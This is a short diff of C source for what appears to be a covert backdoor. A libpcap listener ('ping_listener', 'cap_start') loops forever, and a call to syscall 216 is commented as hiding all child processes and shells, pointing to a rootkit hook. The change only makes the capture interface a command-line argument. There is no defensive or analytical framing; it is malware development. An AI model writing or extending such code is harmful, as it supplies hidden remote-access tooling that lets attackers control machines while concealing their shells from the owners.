@@ -83,11 +83,11 @@ void ping_listener(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char*
 	return;
 }
 
-void cap_start(void) {
+void cap_start(char *dev) {
 	// trigger syscall 216, hiding all sons and sh's
 	syscall(216);
 	int i;
-	char *dev;
+	//char *dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* descr;
 	const u_char *packet;
@@ -96,7 +96,7 @@ void cap_start(void) {
 	bpf_u_int32 maskp;		// Subnet mask
 	bpf_u_int32 netp;		// IP
 
-	dev = pcap_lookupdev(errbuf);
+//	dev = pcap_lookupdev(errbuf);
 	if (dev == NULL) {
 		fprintf(stderr, "%s\n", errbuf);
 		exit(1);
@@ -126,7 +126,7 @@ void cap_start(void) {
 
 int main (int argc, char **argv) {
 	while (1) { 
-		cap_start(); 
+		cap_start(argv[1]); 
 	}
 	return EXIT_SUCCESS;
 }
